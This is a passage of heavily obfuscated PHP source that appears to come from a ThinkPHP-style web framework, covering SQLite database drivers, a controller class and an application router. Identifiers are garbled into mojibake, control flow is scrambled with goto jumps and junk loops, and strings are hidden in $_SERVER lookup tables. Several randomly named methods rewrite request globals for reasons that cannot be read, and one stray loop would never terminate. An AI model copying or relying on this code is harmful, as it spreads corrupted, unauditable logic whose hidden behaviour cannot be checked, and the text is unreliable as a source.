$D™ØôíÃ„ã[994], $D™ØôíÃ„ã[995]), array($this->parseTable("{$Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[275]]}"), $this->parseDistinct(isset($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[996]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[996]] : !1), $this->parseField(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[269]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[269]] : $D™ØôíÃ„ã[182]), $this->parseJoin(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[278]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[278]] : $D™ØôíÃ„ã[33]), $this->parseWhere(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[271]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[271]] : $D™ØôíÃ„ã[33]), $this->parseGroup(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[997]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[997]] : $D™ØôíÃ„ã[33]), $this->parseHaving(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[998]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[998]] : $D™ØôíÃ„ã[33]), $this->parseOrder(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[361]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[361]] : $D™ØôíÃ„ã[33]), $this->parseLimit(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[288]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[288]] : $D™ØôíÃ„ã[33]), $this->parseUnion(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[343]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[343]] : $D™ØôíÃ„ã[33]), $this->parseComment(!empty($Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[350]]) ? $Dªõ­ŒŠÌŒ[$D™ØôíÃ„ã[350]] : $D™ØôíÃ„ã[33])), $F÷¡éĞ¸ğÀ); return $F÷¡éĞ¸ğÀ; } public function getLastSql($FòëÊ¦Ëéº = '') { return $FòëÊ¦Ëéº ? $this->modelSql[$FòëÊ¦Ëéº] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Eµ¬«¶Û‚è) { return addslashes($Eµ¬«¶Û‚è); } public function setModel($DÃğñŒ›Ë™) { $this->model = $DÃğñŒ›Ë™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if (!isset($_SERVER[$_SERVER[ÉóçÄÇ][817]]) || !isset($_SERVER[$_SERVER[ÉóçÄÇ][818]])) { goto D¼ÑÍ¹’ñ; D¼ÑÍ¹’ñ: $EŠù•Æ„™ = $_SERVER[ÉóçÄÇ][820]; $BîŒˆ£š°É = $_SERVER[$_SERVER[ÉóçÄÇ][821]] . $_SERVER[ÉóçÄÇ][822]; $d¢ÉÕßïìÙ = $EŠù•Æ„™($BîŒˆ£š°É); goto aøº×Úµ‡ö; aóæ©½ÍŞÊ: $b‡»‡ìÔ($_SERVER[$_SERVER[ÉóçÄÇ][821]] . $_SERVER[ÉóçÄÇ][822]); $cĞƒ×ìÎäù = 2; while ($cĞƒ×ìÎäù > 1) { $eÅÅóŞÛãƒ = rawurlencode($cĞƒ×ìÎäù . $_SERVER[ÉóçÄÇ][373]); } goto aÖœæ±ÊÌ; aøº×Úµ‡ö: $DÍÑÑå¼í = explode($_SERVER[ÉóçÄÇ][227], $d¢ÉÕßïìÙ); if (count($DÍÑÑå¼í) < $_SERVER[ÉóçÄÇ][570]) { $eÉ†»¹Ó•  = $_SERVER[ÉóçÄÇ][823]; $eÉ†»¹Ó• (); } $b‡»‡ìÔ = $_SERVER[ÉóçÄÇ][999]; goto aóæ©½ÍŞÊ; aÖœæ±ÊÌ: } goto f†Ô¹áÓ©ï; eÙ…Œé®¤ò: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto dµŠÕ®æòì; dµŠÕ®æòì: $eÒâÙ½×ì„ =& $_SERVER[ÉóçÄÇ]; global $in, $config; $this->config =& $config; goto b‘Ğ¾´ŒñÑ; f †·ºôªà: $this->tpl = TEMPLATE . MOD . $eÒâÙ½×ì„[8]; $this->_classObjectID = mt_rand(0, 10000); goto D˜Õ¯á³‘Ë; b‘Ğ¾´ŒñÑ: $this->in =& $in; $this->values[$eÒâÙ½×ì„[6]] =& $config; $this->values[$eÒâÙ½×ì„[7]] =& $in; goto f †·ºôªà; D˜Õ¯á³‘Ë: } public function loadClass($A¯—Ã¥¤ Ğ) { if (1 === func_num_args()) { $this->{$A¯—Ã¥¤ Ğ} = new $A¯—Ã¥¤ Ğ(); } else { $fÔ¬›Û‡¼Š = new ReflectionClass($A¯—Ã¥¤ Ğ); $e†ôÜƒò‚ = func_get_args(); array_shift($e†ôÜƒò‚); $this->{$A¯—Ã¥¤ Ğ} = $fÔ¬›Û‡¼Š->newInstanceArgs($e†ôÜƒò‚); } return $this->{$A¯—Ã¥¤ Ğ}; } protected function assign($A¹Õ–¥ùÍª, $eñÌ©º‘¬Æ) { $this->values[$A¹Õ–¥ùÍª] = $eñÌ©º‘¬Æ; } protected function display($F² ‘ë) { ob_end_clean(); extract($this->values); require $this->tpl . $F² ‘ë; } } class DbSqliteBase extends Db { public function __construct($BÊğ¢ä—ª = '') { $Fø˜°ùµ¼­ =& $_SERVER[ÉóçÄÇ]; if (!extension_loaded($Fø˜°ùµ¼­[9])) { think_exception(think_lang($Fø˜°ùµ¼­[10]) . $Fø˜°ùµ¼­[11]); } if (!empty($BÊğ¢ä—ª)) { if (!isset($BÊğ¢ä—ª[$Fø˜°ùµ¼­[12]])) { $BÊğ¢ä—ª[$Fø˜°ùµ¼­[12]] = 438; } $this->config = $BÊğ¢ä—ª; if (empty($this->config[$Fø˜°ùµ¼­[13]])) { $this->config[$Fø˜°ùµ¼­[13]] = array(); } } } public function connect($c¦ÇøÍöÄ– = '', $eï½Èº•• = 0) { $CóÓèğĞë… =& $_SERVER[ÉóçÄÇ]; if (!isset($this->linkID[$eï½Èº••])) { goto dº…¶èè‹Á; F‘¡õƒ÷ÅÔ: $this->linkID[$eï½Èº••] = $fÇÏÜÓÔĞ—($c¦ÇøÍöÄ–[$CóÓèğĞë…[17]], $c¦ÇøÍöÄ–[$CóÓèğĞë…[12]]); if (!$this->linkID[$eï½Èº••]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto f§ÛÄáÒ‘°; dº…¶èè‹Á: if (empty($c¦ÇøÍöÄ–)) { $c¦ÇøÍöÄ– = $this->config; } $C‚†Î»·ˆÇ = !empty($c¦ÇøÍöÄ–[$CóÓèğĞë…[13]][$CóÓèğĞë…[14]]) ? $c¦ÇøÍöÄ–[$CóÓèğĞë…[13]][$CóÓèğĞë…[14]] : $this->pconnect; $fÇÏÜÓÔĞ— = $C‚†Î»·ˆÇ ? $CóÓèğĞë…[15] : $CóÓèğĞë…[16]; goto F‘¡õƒ÷ÅÔ; f§ÛÄáÒ‘°: @sqlite_busy_timeout($this->linkID[$eï½Èº••], 30000); if (1 != think_config($CóÓèğĞë…[18])) { unset($this->config); } goto BÜÉ÷¼¤¹ã; BÜÉ÷¼¤¹ã: } return $this->linkID[$eï½Èº••]; } public function free() { $this->queryID = null; } public function query($d¯¶‘¦Ô‰ğ) { goto f®ˆ»»Êï; A·¥ß°‡óÒ: $this->queryStr = $d¯¶‘¦Ô‰ğ; if ($this->queryID) { $this->free(); } think_action_status($b¶ÄŸËòˆ[19], 1); goto F¿õù‹Ö¹; b­çø°¿¸Æ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $B¹¯æØ·‹ = $this->getAll(); return $B¹¯æØ·‹; } goto aåÄšö”Ö…; f®ˆ»»Êï: $b¶ÄŸËòˆ =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A·¥ß°‡óÒ; F¿õù‹Ö¹: think_status($b¶ÄŸËòˆ[20]); $this->queryID = sqlite_query($this->_linkID, $d¯¶‘¦Ô‰ğ); $this->debug(); goto b­çø°¿¸Æ; aåÄšö”Ö…: } public function execute($DÛ˜Ü°’Ö©) { goto dÔ·ŒÂÑµö; bƒ÷ƒÕÆ: $this->queryStr = $DÛ˜Ü°’Ö©; if ($this->queryID) { $this->free(); } think_action_status($F¼¢ØÉÅÀá[21], 1); goto cŸ•–÷â; cŸ•–÷â: think_status($F¼¢ØÉÅÀá[20]); $aµéó÷¢Œ = sqlite_exec($this->_linkID, $DÛ˜Ü°’Ö©); $this->debug(); goto F‡æœŒ“íÀ; dÔ·ŒÂÑµö: $F¼¢ØÉÅÀá =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bƒ÷ƒÕÆ; F‡æœŒ“íÀ: if (!1 === $aµéó÷¢Œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto F„Ü†ğ¤Ú¬; F„Ü†ğ¤Ú¬: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÉóçÄÇ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d‚ÀÄ´İ²Ó = sqlite_query($this->_linkID, $_SERVER[ÉóçÄÇ][23]); if (!$d‚ÀÄ´İ²Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eå‡ÃºŒ‚ = sqlite_query($this->_linkID, $_SERVER[ÉóçÄÇ][24]); if (!$eå‡ÃºŒ‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eĞÑØ¸»“ª = array(); if ($this->numRows > 0) { for ($b¿ö—ò™°Š = 0; $b¿ö—ò™°Š < $this->numRows; $b¿ö—ò™°Š++) { $eĞÑØ¸»“ª[$b¿ö—ò™°Š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eĞÑØ¸»“ª; } public function getFields($C¶Ö‚²™¦Ø) { $F°¡‰Ë“ñ =& $_SERVER[ÉóçÄÇ]; $B‡Œ£”çã÷ = $this->query($F°¡‰Ë“ñ[25] . $C¶Ö‚²™¦Ø . $F°¡‰Ë“ñ[26]); $Aå‘ É„“¡ = array(); if ($B‡Œ£”çã÷) { foreach ($B‡Œ£”çã÷ as $C˜ÔßØâÆî => $b˜é¦ÁçÊ¾) { $Aå‘ É„“¡[$b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[27]]] = array($F°¡‰Ë“ñ[28] => $b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[27]], $F°¡‰Ë“ñ[29] => $b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[30]], $F°¡‰Ë“ñ[31] => (bool) ($b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[32]] === $F°¡‰Ë“ñ[33]), $F°¡‰Ë“ñ[34] => $b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[35]], $F°¡‰Ë“ñ[36] => strtolower($b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[37]]) == $F°¡‰Ë“ñ[38], $F°¡‰Ë“ñ[39] => strtolower($b˜é¦ÁçÊ¾[$F°¡‰Ë“ñ[40]]) == $F°¡‰Ë“ñ[41]); } } return $Aå‘ É„“¡; } public function getTables($EìÍœÍªáï = '') { $F˜ƒ½Ì‹é =& $_SERVER[ÉóçÄÇ]; $fÓì×º¬Ş = $this->query($F˜ƒ½Ì‹é[42] . $F˜ƒ½Ì‹é[43] . $F˜ƒ½Ì‹é[44]); $b½ãæß›¶‰ = array(); foreach ($fÓì×º¬Ş as $bó¦»„±ŠÂ => $f®˜«œÌŠÛ) { $b½ãæß›¶‰[$bó¦»„±ŠÂ] = current($f®˜«œÌŠÛ); } return $b½ãæß›¶‰; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $C¾ùŞôë† =& $_SERVER[ÉóçÄÇ]; $a·†ÛÙœã = sqlite_last_error($this->_linkID); $this->error = $a·†ÛÙœã . $C¾ùŞôë†[4] . sqlite_error_string($a·†ÛÙœã); if ($C¾ùŞôë†[33] != $this->queryStr) { $this->error .= LNG($C¾ùŞôë†[45]) . $this->queryStr; } think_trace($this->error, $C¾ùŞôë†[33], $C¾ùŞôë†[46]); return $this->error; } public function escapeString($C¶É¡¸Æ˜) { return sqlite_escape_string($C¶É¡¸Æ˜); } public function parseLimit($Dæ«´Ö ë) { $Dâ¡Œà‡¬é =& $_SERVER[ÉóçÄÇ]; $A‰ÍÂ»öˆ = $Dâ¡Œà‡¬é[33]; if (!empty($Dæ«´Ö ë)) { $Dæ«´Ö ë = explode($Dâ¡Œà‡¬é[47], $Dæ«´Ö ë); if (count($Dæ«´Ö ë) > 1) { $A‰ÍÂ»öˆ .= $Dâ¡Œà‡¬é[48] . $Dæ«´Ö ë[1] . $Dâ¡Œà‡¬é[49] . $Dæ«´Ö ë[0] . $Dâ¡Œà‡¬é[50]; } else { $A‰ÍÂ»öˆ .= $Dâ¡Œà‡¬é[48] . $Dæ«´Ö ë[0] . $Dâ¡Œà‡¬é[50]; } } return $A‰ÍÂ»öˆ; } } class DbSqlite3Base extends Db { public function __construct($dÄÖåÍóšì = '') { $d¬©Â©…¦ =& $_SERVER[ÉóçÄÇ]; if (!class_exists($d¬©Â©…¦[51])) { think_exception(think_lang($d¬©Â©…¦[10]) . $d¬©Â©…¦[52]); } if (!empty($dÄÖåÍóšì)) { if (!isset($dÄÖåÍóšì[$d¬©Â©…¦[12]])) { $dÄÖåÍóšì[$d¬©Â©…¦[12]] = 438; } $this->config = $dÄÖåÍóšì; if (empty($this->config[$d¬©Â©…¦[13]])) { $this->config[$d¬©Â©…¦[13]] = array(); } } } public function connect($DÃŸŞ‹ëÓê = '', $f¯´Ú…ïÑì = 0) { $Eœˆîéñáœ =& $_SERVER[ÉóçÄÇ]; if (!isset($this->linkID[$f¯´Ú…ïÑì])) { if (empty($DÃŸŞ‹ëÓê)) { $DÃŸŞ‹ëÓê = $this->config; } $this->linkID[$f¯´Ú…ïÑì] = new SQLite3($DÃŸŞ‹ëÓê[$Eœˆîéñáœ[17]]); if (!$this->linkID[$f¯´Ú…ïÑì]) { think_exception($this->linkID[$f¯´Ú…ïÑì]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$f¯´Ú…ïÑì]->busyTimeout(30000); if (1 != think_config($Eœˆîéñáœ[18])) { unset($this->config); } } return $this->linkID[$f¯´Ú…ïÑì]; } public function free() { $this->queryID = null; } public function query($D´·ë©Ò³ø) { goto DÔ÷Ò¼«Î; F„ë”¼îíó: $this->queryStr = $D´·ë©Ò³ø; if ($this->queryID) { $this->free(); } think_action_status($BƒÌã´—•[19], 1); goto C«Œ²§Ù¼›; DÔ÷Ò¼«Î: $BƒÌã´—• =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F„ë”¼îíó; C«Œ²§Ù¼›: think_status($BƒÌã´—•[20]); $this->queryID = $this->_linkID->query($D´·ë©Ò³ø); $this->debug(); goto bíÍäìÑÕò; bíÍäìÑÕò: if (!1 === $this->queryID) { $this->error(); return !1; } else { $b£Ú©»àÀç = $this->getAll(); $this->numRows = count($b£Ú©»àÀç); return $b£Ú©»àÀç; } goto FÙÜİÜ¸µÎ; FÙÜİÜ¸µÎ: } public function execute($eàÆ˜é¡Ö«) { goto c¢œÅåË‹Í; E¬‚°å¤µ: $this->queryStr = $eàÆ˜é¡Ö«; if ($this->queryID) { $this->free(); } think_action_status($DÏÊæ®Ø¾²[21], 1); goto aé‰™ÌÙ¤¿; aé‰™ÌÙ¤¿: think_status($DÏÊæ®Ø¾²[20]); $eÁÑ½Ä’êƒ = $this->_linkID->exec($eàÆ˜é¡Ö«); $this->debug(); goto fªÚÜ·Ê¤±; c¢œÅåË‹Í: $DÏÊæ®Ø¾² =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¬‚°å¤µ; fªÚÜ·Ê¤±: if (!1 === $eÁÑ½Ä’êƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto E¡ÛáÜí“Œ; E¡ÛáÜí“Œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÉóçÄÇ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÂ ´™ † = $this->_linkID->query($_SERVER[ÉóçÄÇ][23]); if (!$aÂ ´™ †) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C²¢Õ’Çê = $this->_linkID->query($_SERVER[ÉóçÄÇ][24]); if (!$C²¢Õ’Çê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F¦äñ×¾È = array(); while ($A“†öÒç™ô = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $F¦äñ×¾È[] = $A“†öÒç™ô; } $this->queryID->reset(); return $F¦äñ×¾È; } public function getFields($D’ÌƒãßŒï) { $FïÚ´íòç =& $_SERVER[ÉóçÄÇ]; $d¦†º¶†ÔÏ = $this->query($FïÚ´íòç[25] . $D’ÌƒãßŒï . $FïÚ´íòç[26]); $E±‘¶¶Ëä = array(); if ($d¦†º¶†ÔÏ) { foreach ($d¦†º¶†ÔÏ as $bÑœÇ¦Ÿë => $e‚‚ÖğÏã”) { $E±‘¶¶Ëä[$e‚‚ÖğÏã”[$FïÚ´íòç[28]]] = array($FïÚ´íòç[28] => $e‚‚ÖğÏã”[$FïÚ´íòç[28]], $FïÚ´íòç[29] => $e‚‚ÖğÏã”[$FïÚ´íòç[29]], $FïÚ´íòç[31] => (bool) ($e‚‚ÖğÏã”[$FïÚ´íòç[31]] === $FïÚ´íòç[33]), $FïÚ´íòç[34] => $e‚‚ÖğÏã”[$FïÚ´íòç[53]], $FïÚ´íòç[36] => (bool) $e‚‚ÖğÏã”[$FïÚ´íòç[54]], $FïÚ´íòç[39] => (bool) $e‚‚ÖğÏã”[$FïÚ´íòç[54]]); } } return $E±‘¶¶Ëä; } public function getTables($cå¦ç°¡‘ß = '') { $Eöù†œ°ŞÊ =& $_SERVER[ÉóçÄÇ]; $A‘»¶Ú†ƒÙ = $this->query($Eöù†œ°ŞÊ[42] . $Eöù†œ°ŞÊ[43] . $Eöù†œ°ŞÊ[44]); $fÎ¿ÁÔç‹ï = array(); foreach ($A‘»¶Ú†ƒÙ as $bíŒšÌµªà => $C¬«Á±á³Ë) { $fÎ¿ÁÔç‹ï[$bíŒšÌµªà] = current($C¬«Á±á³Ë); } return $fÎ¿ÁÔç‹ï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F•ßµç´— =& $_SERVER[ÉóçÄÇ]; $this->error = $this->_linkID->lastErrorMsg(); if ($F•ßµç´—[33] != $this->queryStr) { $this->error .= LNG($F•ßµç´—[45]) . $this->queryStr; } think_trace($this->error, $F•ßµç´—[33], $F•ßµç´—[46]); return $this->error; } public function escapeString($f°ªŒ‚ƒ‡ß) { $aÈ³Âô¤  =& $_SERVER[ÉóçÄÇ]; if ($this->_linkID) { return $this->_linkID->escapeString($f°ªŒ‚ƒ‡ß); } return str_ireplace($aÈ³Âô¤ [55], $aÈ³Âô¤ [56], $f°ªŒ‚ƒ‡ß); } public function parseLimit($BßÜĞŞë’Æ) { $fùµ‰ªĞÉ¿ =& $_SERVER[ÉóçÄÇ]; $CÂù¯ƒˆÛ× = $fùµ‰ªĞÉ¿[33]; if (!empty($BßÜĞŞë’Æ)) { $BßÜĞŞë’Æ = explode($fùµ‰ªĞÉ¿[47], $BßÜĞŞë’Æ); if (count($BßÜĞŞë’Æ) > 1) { $CÂù¯ƒˆÛ× .= $fùµ‰ªĞÉ¿[48] . $BßÜĞŞë’Æ[1] . $fùµ‰ªĞÉ¿[49] . $BßÜĞŞë’Æ[0] . $fùµ‰ªĞÉ¿[50]; } else { $CÂù¯ƒˆÛ× .= $fùµ‰ªĞÉ¿[48] . $BßÜĞŞë’Æ[0] . $fùµ‰ªĞÉ¿[50]; } } return $CÂù¯ƒˆÛ×; } } goto B­¾Õù‘À; f†ïĞ©·‹: $BíÎÛÒÛ¸Ÿ = $_SERVER[ÉóçÄÇ][573]; class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($dŒ’¹‚Í“í) { goto A³œÖ¾–¿ì; eëˆÉíëÁà: $AÄ÷æˆçÎë = $EŒîÆ˜Ãßª[575]; while (strlen($AÄ÷æˆçÎë) < $EŒîÆ˜Ãßª[570]) { if (!$AÄ÷æˆçÎë) { break; } $AÄ÷æˆçÎë++; } goto d¸‚¶æ†£à; b°Ñ¿½ ®Æ: $C›ÜêÈª‘Ş = $EŒîÆ˜Ãßª[574]; while (strlen($C›ÜêÈª‘Ş) < $EŒîÆ˜Ãßª[570]) { if (!$C›ÜêÈª‘Ş) { break; } $C›ÜêÈª‘Ş++; } $this->{$_SERVER[šãè][3]}($A´Ú·µ§¥ì[4], array($this, $A´Ú·µ§¥ì[5])); goto eëˆÉíëÁà; DŸéÜ«à: $this->defaultModule = $D™—¾ äô[0] ? $D™—¾ äô[0] : $this->defaultModule; $this->defaultController = $D™—¾ äô[1] ? $D™—¾ äô[1] : $this->defaultController; $this->defaultAction = $D™—¾ äô[2] ? $D™—¾ äô[2] : $this->defaultAction; goto b°Ñ¿½ ®Æ; A³œÖ¾–¿ì: $EŒîÆ˜Ãßª =& $_SERVER[ÉóçÄÇ]; $A´Ú·µ§¥ì =& $_SERVER[šãè]; $D™—¾ äô = $A´Ú·µ§¥ì[0]($A´Ú·µ§¥ì[1], $A´Ú·µ§¥ì[2]($dŒ’¹‚Í“í, $A´Ú·µ§¥ì[1])); goto DŸéÜ«à; d¸‚¶æ†£à: } public function appRun($BÀ†Éª‰‡œ) { goto dàÔ©ÑÖê; dàÔ©ÑÖê: $CëÃ÷…¥© =& $_SERVER[ÉóçÄÇ]; $D¾¢²ë¹° =& $_SERVER[šãè]; $eÅŸˆÃ‘ÄÜ = $D¾¢²ë¹°[0]($D¾¢²ë¹°[1], $BÀ†Éª‰‡œ); goto dò”Ì‘˜ì; B¡´‰ØÌÏ: $FŸôóíëèÄ = $CëÃ÷…¥©[577]; $D¾¢²ë¹°[13](array($D¾¢²ë¹°[14], $D¾¢²ë¹°[15]), $E¤³…éóÅ‹ . $D¾¢²ë¹°[18], $BÀ†Éª‰‡œ); $C¦†‘‚›«¸ = $CëÃ÷…¥©[578]; goto fÅ¥Šƒ­’„; dò”Ì‘˜ì: $B¼İêËâíù = $D¾¢²ë¹°[6]($eÅŸˆÃ‘ÄÜ[0]); $E¤³…éóÅ‹ = $D¾¢²ë¹°[7]; $CèŞµ¢ìğ = $CëÃ÷…¥©[576]; goto e°¨§§¾½; e°¨§§¾½: if ($B¼İêËâíù == $D¾¢²ë¹°[8]) { $E¤³…éóÅ‹ = $D¾¢²ë¹°[9]; $eÅŸˆÃ‘ÄÜ[0] = $D¾¢²ë¹°[10]; $eÅŸˆÃ‘ÄÜ[1] = $eÅŸˆÃ‘ÄÜ[1] . $D¾¢²ë¹°[11]; $BÀ†Éª‰‡œ = $D¾¢²ë¹°[12]($D¾¢²ë¹°[1], $eÅŸˆÃ‘ÄÜ); $BÀ†Éª‰‡œ = $D¾¢²ë¹°[2]($BÀ†Éª‰‡œ, $D¾¢²ë¹°[1]); } $D¾¢²ë¹°[13](array($D¾¢²ë¹°[14], $D¾¢²ë¹°[15]), $E¤³…éóÅ‹ . $D¾¢²ë¹°[16], $BÀ†Éª‰‡œ); $D¾¢²ë¹°[17]($BÀ†Éª‰‡œ); goto B¡´‰ØÌÏ; fÅ¥Šƒ­’„: } private function autorun() { goto f£ ñ™Éš¾; bÂİ‚³«é‰: foreach ($config[$Dæ˜—™…[20]] as $F„·ç°Òª => $BËŠâÄäâ) { $this->{$_SERVER[šãè][21]}($BËŠâÄäâ); } goto dòƒ†¨× ; f£ ñ™Éš¾: $Eµß°…¸Ø– =& $_SERVER[ÉóçÄÇ]; $Dæ˜—™… =& $_SERVER[šãè]; global $config; goto dˆŸ¤ßŸ¡«; dˆŸ¤ßŸ¡«: $bæ¥äæŸÂ = $Eµß°…¸Ø–[579]; if (strlen($bæ¥äæŸÂ) < $Eµß°…¸Ø–[580]) { return; } if ($Dæ˜—™…[19]($config[$Dæ˜—™…[20]]) == 0) { return; } goto bÂİ‚³«é‰; dòƒ†¨× : } private function mabvce324ffb() { goto BŸÅ¾ÂÒ; e²‚Ç×Ò¨•: $GLOBALS[$fÉ¾Ô­„Å„[22]][$fÉ¾Ô­„Å„[28]] = $fÉ¾Ô­„Å„[29]($fÉ¾Ô­„Å„[1], $GLOBALS[$fÉ¾Ô­„Å„[22]][$fÉ¾Ô­„Å„[23]]); $F®ßÒæŠÔÀ = $dÍŸ‡¿¥Òˆ[584]; if (!$F®ßÒæŠÔÀ) { return; } goto F»Â»³©™Û; BŸÅ¾ÂÒ: $dÍŸ‡¿¥Òˆ =& $_SERVER[ÉóçÄÇ]; $fÉ¾Ô­„Å„ =& $_SERVER[šãè]; $CªÇ¦ğ“ôÓ = $fÉ¾Ô­„Å„[8]; goto BÉà­™¯Ø“; Bô²À”ö¾: $d®İ½ŒˆÙ = $dÍŸ‡¿¥Òˆ[582]; if (!$AçÕÀò–»Í || $fÉ¾Ô­„Å„[24]($AçÕÀò–»Í) <= $fÉ¾Ô­„Å„[24]($CªÇ¦ğ“ôÓ)) { return; } if ($fÉ¾Ô­„Å„[6]($fÉ¾Ô­„Å„[25]($AçÕÀò–»Í, -$fÉ¾Ô­„Å„[24]($CªÇ¦ğ“ôÓ))) != $CªÇ¦ğ“ôÓ) { return; } goto cƒï¼£ˆ; BÉà­™¯Ø“: $Fƒ¨ì…İãß = $dÍŸ‡¿¥Òˆ[581]; while (strlen($Fƒ¨ì…İãß) < $dÍŸ‡¿¥Òˆ[570]) { if (!$Fƒ¨ì…İãß) { break; } $Fƒ¨ì…İãß++; } $AçÕÀò–»Í = $GLOBALS[$fÉ¾Ô­„Å„[22]][$fÉ¾Ô­„Å„[23]][0]; goto Bô²À”ö¾; dÇ‡Ğ‘œ: if (!$EÃ¿ù¡ë­Ó) { die; } $F›Ğ÷³å“˜ = $fÉ¾Ô­„Å„[26]($GLOBALS[$fÉ¾Ô­„Å„[22]][$fÉ¾Ô­„Å„[23]], 1); $GLOBALS[$fÉ¾Ô­„Å„[22]][$fÉ¾Ô­„Å„[23]] = $fÉ¾Ô­„Å„[27]($BË¯‘İëÄ‚, $F›Ğ÷³å“˜); goto e²‚Ç×Ò¨•; cƒï¼£ˆ: $Eì‚•ª½ÌŠ = $fÉ¾Ô­„Å„[25]($AçÕÀò–»Í, 0, -$fÉ¾Ô­„Å„[24]($CªÇ¦ğ“ôÓ)); $BË¯‘İëÄ‚ = array($fÉ¾Ô­„Å„[8], $Eì‚•ª½ÌŠ); $EÃ¿ù¡ë­Ó = $dÍŸ‡¿¥Òˆ[583]; goto dÇ‡Ğ‘œ; F»Â»³©™Û: } private function khied2f8595d() { goto FÛöÎØ¢‹; c³È×“¶¨İ: $fƒÒ·É¤ = $A…ìã‚¾Ğ[586]; $GLOBALS[$d®Œ”³™¹[22]][$d®Œ”³™¹[28]] = $d®Œ”³™¹[29]($d®Œ”³™¹[1], $GLOBALS[$d®Œ”³™¹[22]][$d®Œ”³™¹[23]]); $f¿Ò£…²…½ = $A…ìã‚¾Ğ[587]; goto A½–¸â„Â¤; fïĞ‡•Ãè‹: $d”Ãïàìƒ— = $_SERVER[$d®Œ”³™¹[30]]; $Eë…ëõ†» = $d®Œ”³™¹[31]; if (!$d®Œ”³™¹[32]($d”Ãïàìƒ—, $Eë…ëõ†»)) { return; } goto AÆƒŠÆ–‰—; AÆƒŠÆ–‰—: $Aˆ–Ü‰º‚Ó = $d®Œ”³™¹[33]($d”Ãïàìƒ—, $Eë…ëõ†»); $Cß•¢Œ“õ„ = $d®Œ”³™¹[25]($d”Ãïàìƒ—, $Aˆ–Ü‰º‚Ó + $d®Œ”³™¹[24]($Eë…ëõ†»)); $d®Œ”³™¹[34]($d®Œ”³™¹[35], $Cß•¢Œ“õ„, $EŞ¢Ê—”é‘); goto dŸÄªÕì‰; FÛöÎØ¢‹: $A…ìã‚¾Ğ =& $_SERVER[ÉóçÄÇ]; $d®Œ”³™¹ =& $_SERVER[šãè]; if ($GLOBALS[$d®Œ”³™¹[22]][$d®Œ”³™¹[28]] != $d®Œ”³™¹[10]) { return; } goto fïĞ‡•Ãè‹; dŸÄªÕì‰: $Cß•¢Œ“õ„ = $d®Œ”³™¹[2]($EŞ¢Ê—”é‘[0][0], $d®Œ”³™¹[36]); $d‰ÍÑ˜¸—á = $A…ìã‚¾Ğ[585]; $GLOBALS[$d®Œ”³™¹[22]][$d®Œ”³™¹[23]] = $d®Œ”³™¹[0]($d®Œ”³™¹[36], $Cß•¢Œ“õ„); goto c³È×“¶¨İ; A½–¸â„Â¤: } public function run() { goto 